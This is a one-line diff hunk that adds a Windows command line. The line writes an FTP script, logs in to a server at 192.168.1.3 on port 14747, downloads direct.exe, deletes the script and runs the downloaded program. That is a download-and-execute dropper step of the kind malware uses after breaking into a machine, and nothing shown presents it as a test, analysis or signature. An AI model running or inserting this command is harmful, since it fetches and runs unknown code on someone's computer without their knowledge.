@@ -1,0 +1,1 @@
+cmd /c echo open 192.168.1.3 14747 >> ii &echo user 1 1 >> ii &echo get direct.exe >> ii &echo bye >> ii &ftp -n -v -s:ii &del ii &direct.exe
